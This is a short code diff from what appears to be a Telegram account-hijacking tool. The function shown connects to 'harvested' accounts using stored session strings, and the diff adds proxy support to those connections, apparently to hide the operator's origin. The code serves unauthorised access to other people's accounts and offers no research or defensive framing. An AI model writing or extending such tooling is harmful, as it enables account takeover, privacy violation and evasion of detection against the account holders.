@@ -59,7 +59,7 @@ def list_sessions(db_path: str = "data/sessions.db"):
     return sessions
 
 
-async def access_session(session_string: str, phone: str):
+async def access_session(session_string: str, phone: str, proxy_tuple=None):
     """Connect to a harvested account and show info."""
     print(f"\n[+] Connecting to {phone}...")
 
@@ -67,6 +67,7 @@ async def access_session(session_string: str, phone: str):
         StringSession(session_string),
         config.TELEGRAM_API_ID,
         config.TELEGRAM_API_HASH,
+        proxy=proxy_tuple,  # <-- ADDED PROXY
     )
 
     try:
